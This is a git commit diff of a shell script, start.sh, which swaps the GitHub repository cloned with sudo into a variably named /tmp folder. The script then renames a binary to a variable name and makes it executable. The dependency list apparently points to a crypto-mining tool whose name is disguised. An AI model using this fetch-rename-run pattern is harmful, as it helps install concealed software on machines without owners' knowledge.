0ee46d0a5ef234de6022c02603cee2c071801c86
soomtom <51830714+soomtom@users.noreply.github.com>
2019-06-14 16:47:15 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -45,7 +45,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir $tmpfoldername
-sudo git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
+sudo git clone https://github.com/soomtom/local.git /tmp/$tmpfoldername
 cd /tmp/$tmpfoldername
 sudo mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
 sudo chmod +x /tmp/$tmpfoldername/$softwarename
